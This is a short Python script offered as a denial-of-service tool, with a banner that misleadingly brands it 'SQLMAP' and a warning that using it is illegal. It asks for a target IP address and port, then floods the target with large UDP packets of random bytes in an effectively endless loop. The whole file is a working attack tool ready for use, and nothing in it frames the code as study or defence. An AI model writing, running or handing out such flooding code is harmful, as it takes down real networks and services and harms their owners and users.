import socket, random, time, colorama
from colorama import Style, Fore, Back

colorama.init(autoreset=True)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input(f"""
{Fore.RED}
 _____ _____ __    _____ _____ _____ 
|   __|     |  |  |     |  _  |  _  |
|__   |  |  |  |__| | | |     |   __|
|_____|__  _|_____|_|_|_|__|__|__|   
         |__|                        
{Fore.WHITE}
Using the DDOS SQLMAP Version is illegal.
Use this at your own risk.

Target IP: """)

port = int(input("Target Port:"))
print("Exit to stop.")
time.sleep(2)

s.connect((ip, port))

for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')